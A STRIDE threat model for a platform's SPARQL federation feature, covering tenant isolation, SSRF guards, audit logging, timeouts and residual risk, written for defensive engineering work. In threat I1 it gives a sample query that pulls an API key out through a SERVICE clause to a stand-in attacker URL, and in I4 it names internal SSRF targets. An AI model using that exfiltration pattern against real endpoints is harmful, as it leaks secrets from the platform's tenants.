# STRIDE Threat Model — SPARQL Federation (Phase 230.8)

> **Audience**: Platform security, Engineering leads, DPO.
> **Phase**: 230.8 — REQ-SEM-FED-001 + REQ-SEM-FED-002.
> **Last updated**: 2026-05-01.
> **Status**: Authored as a launch-prerequisite for the federation feature.

This document captures the threat surface introduced by SPARQL federation
(SERVICE clauses against external endpoints) and the mitigations layered
to bring residual risk to acceptable levels. Federation is the first
feature on Meshant where the application *deliberately* makes outbound
calls to tenant-controlled URLs, so the SSRF + cross-tenant + data-
exposure surfaces deserve explicit treatment.

---

## System under threat

| Component | Description |
| --------- | ----------- |
| **Endpoint** | `POST /api/v1/semantic/sparql` (SPARQL execution) and `GET\|POST\|PATCH\|DELETE /api/v1/tenants/<tenant_id>/sparql-endpoints/` (allowlist CRUD) |
| **Code path** | `SPARQLQueryService.run` → `validate_sparql_query` (with `tenant_id`) → `federation.extract_service_urls` + `is_allowlisted` → `SemanticServiceClient.query_sparql` (issues outbound HTTP) → `emit_federated_query_audit` |
| **Data** | `TenantSparqlEndpoint` rows (per-tenant allowlist, Phase 230.8.1); inbound query string; outbound query string sent to partner; partner's response merged back into the main result set |
| **Capability flag** | `Tenant.semantic_federation_enabled` (per-tenant kill switch — implicit via empty allowlist, since validator default-rejects when no row matches). `SEMANTIC_FEDERATION_ALLOW_PRIVATE` Django setting (operator override for on-prem). |
| **Trust boundaries** | (a) tenant-user browser ↔ Hub API; (b) Hub API ↔ semantic-service ↔ Fuseki (in-cluster); (c) semantic-service ↔ **external SPARQL endpoint** — the **load-bearing boundary**; (d) tenant A's allowlist ↔ tenant B's allowlist (must remain isolated) |

---

## STRIDE analysis

### S — Spoofing identity

| # | Threat | Mitigation | Pinned by |
| - | ------ | ---------- | --------- |
| S1 | A user from tenant A submits a SERVICE query targeting an endpoint registered only on tenant B's allowlist | `validate_sparql_query` is called with the request's tenant id. `is_allowlisted(tenant_id, url)` filters `TenantSparqlEndpoint` rows by the **calling tenant's** id only — tenant B's rows are invisible to tenant A's queries. | `test_federation.py::FederationValidatorTests::test_cross_tenant_endpoint_does_not_count` |
| S2 | A non-admin user adds an allowlist entry, escalating their authority | The allowlist CRUD viewset uses `permission_classes=[IsAuthenticated, HasRole("TENANT_ADMIN")]`. Non-admins receive 401/403. | `test_federation.py::FederationCRUDPermissionTests::test_non_admin_post_is_403` |
| S3 | A TENANT_ADMIN of tenant A reaches the URL `/tenants/<tenant_b_id>/sparql-endpoints/` to manage tenant B's allowlist | The view's `_resolve_tenant_or_404` enforces same-tenant access; cross-tenant attempts return **404** (info-leak hardening — same shape as Phase 228.F1 lineage). PLATFORM_ADMINs may manage any tenant. | `test_federation.py::FederationCRUDPermissionTests::test_admin_cross_tenant_blocked` |
| S4 | The partner endpoint impersonates a different organisation (DNS rebinding, BGP hijack, certificate spoofing) | TLS certificate validation is enforced by the HTTP client (no self-signed acceptance, no `verify=False`). Partner identity is anchored to the URL stored in `TenantSparqlEndpoint`, which is allowlist-managed (admin-controlled). | Code review — `SemanticServiceClient` uses default `requests`/`httpx` cert verification. |

### T — Tampering with data

| # | Threat | Mitigation | Pinned by |
| - | ------ | ---------- | --------- |
| T1 | The partner endpoint returns malicious triples (e.g. asserting `?asset prov:wasDerivedFrom <evil_uri>`) that pollute Meshant's view | Federated SERVICE results are scoped to the query's `WHERE` clause and never persisted to the local store — they only flow into the response of *that one query*. There is no auto-import. | Spec — REQ-SEM-FED-001 explicitly bans materialising federated triples. Verified by code review of the dispatcher (no `INSERT DATA` path). |
| T2 | An attacker mutates an existing `TenantSparqlEndpoint` row to point at an attacker-controlled URL (silent allowlist drift) | All allowlist mutations emit `SEMANTIC_FEDERATION_ALLOWLIST_ADD` / `_REMOVE` audit rows (with the URL in `details_json`). The audit log is append-only (Phase 234 tamper-evidence pending). The CRUD viewset writes events on every PATCH/POST/DELETE. | Audit registry test + manual verification of viewset emit calls. |
| T3 | Database-level tampering bypasses application checks (a privileged DB operator edits the row directly) | Out of scope for application-layer threat model. Mitigated by Phase 234.1 audit-tamper-evidence (hash chain + S3 Object Lock) when shipped. | Phase 234 work. |

### R — Repudiation

| # | Threat | Mitigation | Pinned by |
| - | ------ | ---------- | --------- |
| R1 | A tenant claims they never queried a partner endpoint, but the partner has logged the call | Every federated query emits a `SEMANTIC_FEDERATED_QUERY` audit row carrying `target_url`, `query_sha256`, `response_time_ms`, `outcome` (SUCCESS/DENIED/ERROR/TIMEOUT). One audit row per SERVICE URL — multi-partner queries produce N rows. The full query text is not stored (privacy + size); the SHA-256 lets the regulator reconstruct the query when paired with the partner's logs. | `test_federation.py::FederationAuditTests::test_federated_query_emits_audit_row` |
| R2 | A query is denied at validation time but the user denies it ever happened | DENIED queries also emit a `SEMANTIC_FEDERATED_QUERY` audit row (with `outcome=DENIED`, `result=FAILURE`). The deny path runs *before* the outbound call, so target_url is the URL the validator extracted. | `SPARQLQueryService._emit_federation_audit_for_denied` is invoked from `run` whenever `code=SPARQL_FEDERATION_NOT_ALLOWED` is returned. |
| R3 | The allowlist drifts and the auditor cannot reconstruct historical state | `SEMANTIC_FEDERATION_ALLOWLIST_ADD` + `_REMOVE` audit rows form a complete log of allowlist mutations. Replaying the events reproduces the active allowlist at any past timestamp. | Audit registry — both codes registered in `LINEAGE_AUDIT_ACTIONS`. |

### I — Information disclosure (load-bearing boundary)

| # | Threat | Mitigation | Pinned by |
| - | ------ | ---------- | --------- |
| I1 | A malicious tenant SPARQL query exfiltrates Meshant's local triples to a tenant-controlled SERVICE endpoint (e.g. `SELECT ?secret WHERE { ?asset hub:apiKey ?secret . SERVICE <http://attacker/?leak=> { } }`) | (a) The allowlist gates **destination** URLs — the attacker must first add their endpoint, which requires TENANT_ADMIN role + leaves an audit trail. (b) The validator's existing security check (`_validate_query_security`) blocks queries that reference URIs from other tenants. (c) Local triples flow OUT of Meshant only via the existing `rdf_export` endpoint, which is throttled + role-gated. | `test_federation.py::FederationCRUDPermissionTests` + `_validate_query_security` tests. |
| I2 | A SERVICE clause exfiltrates **another tenant's** triples by smuggling them into a federated query body | The local SPARQL execution runs against the calling tenant's named graph (`urn:tenant:<tenant_id>`); cross-tenant URIs in the local query are rejected at validation time before SERVICE dispatch. | Existing tenant-isolation test in `_validate_query_security`. |
| I3 | A per-resource `semantic_federate_optout=True` flag is ignored by the federation dispatcher | The opt-out flag means *Meshant SHALL NOT expose this resource's triples to external SERVICE callers*. Enforced today at the `rdf_export` boundary via `hub.apps.semantic.federation.filter_optout_triples`: parses the serialised RDF body, drops every triple whose subject IRI matches an opted-out resource (Asset / Contract / Dataset), reserialises in the same content type. Subject-position only — object-position references are preserved so that hiding asset A doesn't prune unrelated resources that link to A. Future federation responder endpoints SHALL reuse the same helper. For SERVICE *outbound* (Meshant calling out to a partner) the flag is informational — Meshant cannot enforce opt-out on a partner's own data. | REQ-SEM-FED-002 spec; `filter_optout_triples` test coverage in `test_federation.py::FederationOptOutFilterTests`; helper consumed by `views.py::rdf_export`. |
| I4 | An SSRF target inside the cluster (e.g. `http://kube-state-metrics.kube-system:8080/`) is registered as an allowlist endpoint, leaking cluster-internal data via SERVICE | Two layers: (a) `validate_federation_endpoint_url` SSRF guard rejects loopback / link-local / RFC1918 / cloud-IMDS at allowlist-create time (returns `code=SSRF_TARGET_BLOCKED`). (b) Helm `allow-semantic-federation-egress` NetworkPolicy excludes the same CIDR ranges at the cluster network layer (defense in depth). | `test_federation.py::FederationSSRFCreateTests` (loopback / link-local / RFC1918) + Helm template review. |
| I5 | DNS rebinding — partner endpoint resolves to a public IP at allowlist-creation time but rebinds to a private IP at query-dispatch time | Mitigation today: the egress NetworkPolicy enforces the CIDR exclusion at packet level, so even a rebind to RFC1918 cannot reach internal services. Future hardening: **DNS-pin** the resolved IP at CRUD-create time (out of scope for 230.8 — tracked as a follow-on). | Helm NetworkPolicy + follow-on ticket. |

### D — Denial of service

| # | Threat | Mitigation | Pinned by |
| - | ------ | ---------- | --------- |
| D1 | A slow-loris partner endpoint holds the federation request open indefinitely, exhausting semantic-service worker pool | `FEDERATION_HARD_TIMEOUT_SECONDS = 30`. `SPARQLQueryService.run` clamps `timeout = min(timeout, 30)` whenever the parsed query has any SERVICE URLs. The partner's slow response cannot exceed 30s. | `hub.apps.semantic.federation.FEDERATION_HARD_TIMEOUT_SECONDS` constant + run() clamp. |
| D2 | A flood of federated queries consumes all Hub workers | The existing per-user SPARQL throttle (UserRateThrottle on the SPARQL endpoint) applies. Federation does not increase the request budget. | Existing throttle. |
| D3 | A misconfigured allowlist with thousands of entries makes `is_allowlisted()` slow on every query | The `tspe_tenant_active_idx` (tenant, is_active) index supports the per-query lookup as an index-only scan. Linear scan over the active set is O(N) where N is small in practice (single digits per tenant). | Migration `0007_tenant_sparql_endpoint.py` defines the index. |

### E — Elevation of privilege

| # | Threat | Mitigation | Pinned by |
| - | ------ | ---------- | --------- |
| E1 | A non-admin user crafts a SERVICE query to bypass the role gate on allowlist CRUD (i.e. manage allowlist via SPARQL side effect) | SERVICE clauses are **read-only** on the partner side; they cannot mutate the local `TenantSparqlEndpoint` table. The local SPARQL engine rejects UPDATE keywords up-front. | `test_phase30_semantic_security.py` (existing UPDATE-keyword block). |
| E2 | An attacker uses a federated SERVICE call to hit a partner's privileged admin endpoint via SSRF (the partner's endpoint accepts our SPARQL but exposes admin functions) | The partner is a third party; the threat model assumes mutual untrust. Mitigation is at the partner side. Meshant's responsibility ends at "we only sent the SPARQL the user asked us to send, to a URL the tenant admin allowlisted, and we audited the request." | Out of scope for Meshant beyond the audit row. |

---

## Residual risk

| Item | Risk | Owner | Plan |
| ---- | ---- | ----- | ---- |
| DNS rebinding (I5) | Low (NetworkPolicy CIDR exclusion mitigates) | Security | Follow-on ticket: DNS-pin resolved IPs at CRUD-create time + verify at dispatch. |
| Outbound `semantic_federate_optout` enforcement (I3) | Informational only | Engineering | Document clearly that the flag is responder-side; consider client-side query rewriting in a future phase. |
| Allowlist enumeration (S3 mitigated by 404, but timing still differs) | Very low | Security | Constant-time response for 404-on-cross-tenant — track as a hardening ticket if pen-test flags it. |
| `SEMANTIC_FEDERATION_ALLOW_PRIVATE=True` in production | Operator-managed | Ops | Document in runbook; require change-management for the flag flip. |

---

## Data flow

```text
                        ┌─────────────────────────────┐
   SPARQL query  ──────►│  POST /semantic/sparql      │
   (incl. SERVICE)      │  (HasRole: any auth user)   │
                        └────────────┬────────────────┘
                                     │
                                     ▼
                ┌────────────────────────────────────────┐
                │  validate_sparql_query(query, tenant)  │
                │  ├─ rdflib AST walk → SERVICE urls     │
                │  └─ is_allowlisted(tenant, url) ?      │
                └────────────┬─────────────┬─────────────┘
                             │             │
                       allowlisted     not allowlisted
                             │             │
                             ▼             ▼
              ┌───────────────────┐  ┌─────────────────┐
              │  dispatch (≤30s)  │  │  400 + DENIED   │
              │  via semantic-svc │  │  audit row      │
              └─────────┬─────────┘  └─────────────────┘
                        │
                        ▼
              ┌──────────────────────┐
              │  egress (NetworkPol) │
              │  excludes RFC1918    │
              └──────────┬───────────┘
                         ▼
                ┌──────────────────┐
                │ partner SPARQL   │
                │ endpoint (TLS)   │
                └────────┬─────────┘
                         ▼
              ┌──────────────────────┐
              │  audit row written   │
              │  (target_url +       │
              │   sha256(query) +    │
              │   response_time_ms)  │
              └──────────────────────┘
```

---

## Verification matrix

| Threat | Test | Status |
| ------ | ---- | ------ |
| S1 (cross-tenant allowlist) | `test_cross_tenant_endpoint_does_not_count` | ✓ |
| S2 (non-admin CRUD) | `test_non_admin_post_is_403` | ✓ |
| S3 (cross-tenant CRUD URL) | `test_admin_cross_tenant_blocked` | ✓ |
| I4-loopback | `test_loopback_rejected` | ✓ |
| I4-link-local IMDS | `test_link_local_metadata_rejected` | ✓ |
| I4-RFC1918 | `test_rfc1918_rejected` | ✓ |
| R1 (audit emission) | `test_federated_query_emits_audit_row` | ✓ |
| R3 (audit codes registered) | `test_semantic_federated_query_constant_exists` | ✓ |
| Per-resource opt-out | `test_*_has_optout_field_default_false` | ✓ |
| D1 (30s hard timeout) | `FEDERATION_HARD_TIMEOUT_SECONDS` constant + clamp in `run` | ✓ |
| Egress NetworkPolicy CIDR exclusion | Helm template + values gate | ✓ |
